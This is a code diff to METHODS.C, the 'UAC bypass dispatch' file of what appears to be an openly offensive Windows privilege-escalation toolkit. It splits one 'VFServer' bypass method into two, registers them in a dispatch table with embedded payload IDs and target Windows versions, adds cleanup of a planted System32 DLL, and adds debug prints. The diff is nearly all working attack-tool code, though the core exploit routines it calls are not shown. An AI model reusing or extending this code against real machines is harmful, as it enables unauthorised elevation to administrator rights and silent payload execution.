@@ -4,9 +4,9 @@
 *
 *  TITLE:       METHODS.C
 *
-*  VERSION:     3.61
+*  VERSION:     3.62
 *
-*  DATE:        22 Jun 2022
+*  DATE:        08 Jul 2022
 *
 *  UAC bypass dispatch.
 *
@@ -47,7 +47,8 @@ UCM_API(MethodPca);
 UCM_API(MethodCurVer);
 UCM_API(MethodMsdt);
 UCM_API(MethodDotNetSerial);
-UCM_API(MethodVFServer);
+UCM_API(MethodVFServerTaskSched);
+UCM_API(MethodVFServerDiagProf);
 
 ULONG UCM_WIN32_NOT_IMPLEMENTED[] = {
     UacMethodWow64Logger,
@@ -60,7 +61,8 @@ ULONG UCM_WIN32_NOT_IMPLEMENTED[] = {
     UacMethodMsStoreProtocol,
     UacMethodPca,
     UacMethodCurVer,
-    UacMethodVFServer
+    UacMethodVFServerTaskSched,
+    UacMethodVFServerDiagProf
 };
 
 UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
@@ -138,7 +140,8 @@ UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodNICPoison, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
     { MethodMsdt, { NT_WIN10_THRESHOLD1, MAXDWORD }, FUBUKI32_ID, FALSE, FALSE, TRUE },
     { MethodDotNetSerial, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
-    { MethodVFServer, { NT_WIN8_BLUE, MAXDWORD}, AKATSUKI_ID, FALSE, TRUE, TRUE }
+    { MethodVFServerTaskSched, { NT_WIN8_BLUE, MAXDWORD}, AKATSUKI_ID, FALSE, TRUE, TRUE },
+    { MethodVFServerDiagProf, { NT_WIN7_RTM, MAXDWORD}, AKATSUKI_ID, FALSE, TRUE, TRUE }
 };
 
 /*
@@ -218,6 +221,8 @@ VOID PostCleanupAttempt(
     _In_ UCM_METHOD Method
 )
 {
+    BOOL bHit = TRUE;
+
     switch (Method) {
 
     case UacMethodDISM:
@@ -226,6 +231,7 @@ VOID PostCleanupAttempt(
         break;
 
     case UacMethodWow64Logger:
+    case UacMethodVFServerDiagProf:
         ucmMethodCleanupSingleItemSystem32(WOW64LOG_DLL);
         break;
 
@@ -241,7 +247,13 @@ VOID PostCleanupAttempt(
         ucmHakrilMethodCleanup();
         break;
 
+    default:
+        bHit = FALSE;
+        break;
+
     }
+
+    ucmConsolePrintValueUlong(TEXT("[+] PostCleanupAttempt for method"), (ULONG)Method, FALSE);
 }
 
 /*
@@ -270,8 +282,9 @@ NTSTATUS MethodsManagerCall(
         return STATUS_NOT_SUPPORTED;
     }
 
-    if (Method >= UacMethodMax)
+    if (Method >= UacMethodMax) {
         return STATUS_INVALID_PARAMETER;
+    }
 
     //
     // Is method implemented for Win32?
@@ -290,6 +303,9 @@ NTSTATUS MethodsManagerCall(
     Status = IsMethodMatchRequirements(Entry);
     if (!NT_SUCCESS(Status))
         return Status;
+
+    ucmConsolePrintValueUlong(TEXT("[+] MethodsManagerCall->Method"), Method, FALSE);
+    ucmConsolePrintValueUlong(TEXT("[+] MethodsManagerCall->Entry->PayloadResourceId"), Entry->PayloadResourceId, TRUE);
 
     if (Entry->PayloadResourceId != PAYLOAD_ID_NONE) {
 
@@ -311,6 +327,8 @@ NTSTATUS MethodsManagerCall(
     ParamsBlock.PayloadCode = PayloadCode;
     ParamsBlock.PayloadSize = PayloadSize;
 
+    ucmConsolePrintValueUlong(TEXT("[+] MethodsManagerCall->Entry->SetParameters"), Entry->SetParameters, FALSE);
+
     //
     // Set shared parameters.
     //
@@ -319,6 +337,7 @@ NTSTATUS MethodsManagerCall(
     //
     if (Entry->SetParameters) {
         bParametersBlockSet = supCreateSharedParametersBlock(g_ctx);
+        ucmConsolePrintValueUlong(TEXT("[+] MethodsManagerCall->bParametersBlockSet"), bParametersBlockSet, FALSE);
     }
 
     MethodResult = Entry->Routine(&ParamsBlock);
@@ -333,7 +352,8 @@ NTSTATUS MethodsManagerCall(
     //
     if (Entry->SetParameters) {
         if (bParametersBlockSet) {
-            supWaitForGlobalCompletionEvent();
+            Status = supWaitForGlobalCompletionEvent();
+            ucmConsolePrintStatus(TEXT("[+] MethodsManagerCall->supWaitForGlobalCompletionEvent"), Status);
             supDestroySharedParametersBlock(g_ctx);
         }
     }
@@ -759,9 +779,16 @@ UCM_API(MethodDotNetSerial)
     return ucmDotNetSerialMethod(lpszPayload);
 }
 
-UCM_API(MethodVFServer)
+UCM_API(MethodVFServerTaskSched)
 {
-    return ucmVirtualFactoryServer(
+    return ucmVFServerTaskSchedMethod(
+        Parameter->PayloadCode,
+        Parameter->PayloadSize);
+}
+
+UCM_API(MethodVFServerDiagProf)
+{
+    return ucmVFServerDiagProfileMethod(
         Parameter->PayloadCode,
         Parameter->PayloadSize);
 }
